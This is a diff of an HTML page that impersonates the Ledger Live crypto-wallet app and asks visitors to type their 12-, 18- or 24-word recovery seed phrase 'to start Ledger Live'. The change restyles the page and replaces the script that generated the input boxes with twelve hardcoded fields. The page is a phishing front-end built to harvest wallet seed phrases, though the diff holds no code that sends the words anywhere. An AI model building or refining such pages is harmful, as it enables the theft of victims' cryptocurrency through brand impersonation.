@@ -1,178 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ledger Live</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
+
     body {
-      background-color: #111;
-      color: #fff;
-      font-family: 'Courier New', monospace;
       margin: 0;
       padding: 0;
+      background-color: #121212;
+      color: white;
+      font-family: 'Space Mono', monospace;
+      display: flex;
+      height: 100vh;
     }
 
+    /* Sidebar */
     .sidebar {
-      background-color: #181818;
-      width: 250px;
-      height: 100vh;
-      padding-top: 40px;
-      position: fixed;
-      left: 0;
-      top: 0;
+      width: 270px;
+      background-color: #1A1A1A;
+      padding: 30px 25px;
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
     }
 
     .sidebar h2 {
-      text-align: center;
+      font-size: 20px;
+      letter-spacing: 2px;
+      margin-bottom: 20px;
       color: #fff;
-      margin-bottom: 40px;
     }
 
-    .sidebar ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    .sidebar ul li {
-      padding: 15px 25px;
-      font-size: 15px;
+    .menu-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
       color: #ccc;
+      font-size: 15px;
       cursor: pointer;
       transition: 0.3s;
     }
 
-    .sidebar ul li:hover {
-      color: #fff;
-      background-color: #222;
+    .menu-item:hover {
+      color: white;
     }
 
-    .main {
-      margin-left: 270px;
-      padding: 40px;
+    /* Main Content */
+    .content {
+      flex: 1;
+      padding: 60px 80px;
     }
 
     h1 {
-      font-size: 26px;
-      letter-spacing: 1px;
-    }
-
-    .tabs {
-      display: flex;
-      gap: 15px;
-      margin-top: 20px;
-      margin-bottom: 30px;
-    }
-
-    .tabs button {
-      background-color: #222;
-      color: #fff;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: background 0.3s ease;
-    }
-
-    .tabs button.active {
-      background-color: #9b9bff;
-      color: #000;
-    }
-
-    .tabs button:hover {
-      background-color: #444;
-    }
-
-    .phrase-container {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-      max-width: 800px;
-    }
-
-    .phrase-input {
-      background-color: #222;
-      border: none;
-      color: #fff;
-      padding: 10px;
-      border-radius: 5px;
-      font-size: 14px;
-    }
-
-    .continue-btn {
-      margin-top: 40px;
-      padding: 12px 35px;
-      border: none;
-      border-radius: 25px;
-      background-color: #fff;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    .continue-btn:hover {
-      background-color: #9b9bff;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 20px;
     }
 
     p {
-      color: #bbb;
-      margin-top: 10px;
+      font-size: 15px;
+      color: #aaa;
+      line-height: 1.6;
+    }
+
+    .word-options {
+      margin: 30px 0;
+    }
+
+    .word-options button {
+      background-color: #2e2e2e;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      margin-right: 10px;
+      border-radius: 6px;
+      font-family: 'Space Mono', monospace;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .word-options button.active {
+      background-color: #7a5df7;
+    }
+
+    /* Input Grid */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      margin-top: 25px;
+      max-width: 1000px;
+    }
+
+    input {
+      background-color: #222;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      color: white;
+      font-size: 14px;
+      font-family: 'Space Mono', monospace;
+      outline: none;
+    }
+
+    /* Continue Button */
+    .continue {
+      background-color: white;
+      color: black;
+      border: none;
+      padding: 14px 40px;
+      font-size: 15px;
+      font-family: 'Space Mono', monospace;
+      border-radius: 25px;
+      cursor: pointer;
+      margin-top: 35px;
+      transition: 0.3s;
+    }
+
+    .continue:hover {
+      background-color: #e0e0e0;
     }
   </style>
 </head>
 <body>
 
   <div class="sidebar">
-    <h2>[ LEDGER-LIVE ]</h2>
-    <ul>
-      <li>📂 Portfolio</li>
-      <li>💱 Market</li>
-      <li>👤 Accounts</li>
-      <li>📤 Send</li>
-      <li>📥 Receive</li>
-      <li>💰 Buy/Sell</li>
-      <li>🔄 Swap</li>
-      <li>🧰 Manager</li>
-    </ul>
+    <h2>[ LEDGER–LIVE ]</h2>
+    <div class="menu-item">📁 Portfolio</div>
+    <div class="menu-item">💹 Market</div>
+    <div class="menu-item">👤 Accounts</div>
+    <div class="menu-item">📤 Send</div>
+    <div class="menu-item">📥 Receive</div>
+    <div class="menu-item">💰 Buy/Sell</div>
+    <div class="menu-item">🔄 Swap</div>
+    <div class="menu-item">🧰 Manager</div>
   </div>
 
-  <div class="main">
+  <div class="content">
     <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
-    <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
-    **Ledger does not keep a copy of your recovery phrase.<br>
-    **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+    <p>
+      Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
+      <b>**Ledger does not keep a copy of your recovery phrase.**</b><br>
+      <b>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.**</b>
+    </p>
 
-    <div class="tabs">
-      <button id="btn12" class="active" onclick="generateInputs(12, this)">12 Words</button>
-      <button id="btn18" onclick="generateInputs(18, this)">18 Words</button>
-      <button id="btn24" onclick="generateInputs(24, this)">24 Words</button>
+    <div class="word-options">
+      <button class="active">12 Words</button>
+      <button>18 Words</button>
+      <button>24 Words</button>
     </div>
 
-    <div id="phraseContainer" class="phrase-container"></div>
+    <div class="grid">
+      <input type="text" placeholder="1">
+      <input type="text" placeholder="2">
+      <input type="text" placeholder="3">
+      <input type="text" placeholder="4">
+      <input type="text" placeholder="5">
+      <input type="text" placeholder="6">
+      <input type="text" placeholder="7">
+      <input type="text" placeholder="8">
+      <input type="text" placeholder="9">
+      <input type="text" placeholder="10">
+      <input type="text" placeholder="11">
+      <input type="text" placeholder="12">
+    </div>
 
-    <button class="continue-btn">Continue...</button>
+    <button class="continue">Continue...</button>
   </div>
-
-  <script>
-    function generateInputs(count, btn) {
-      document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      const container = document.getElementById('phraseContainer');
-      container.innerHTML = '';
-      for (let i = 1; i <= count; i++) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.placeholder = i;
-        input.className = 'phrase-input';
-        container.appendChild(input);
-      }
-    }
-
-    // Default: 12 words visible
-    window.onload = () => generateInputs(12, document.getElementById('btn12'));
-  </script>
 
 </body>
 </html>
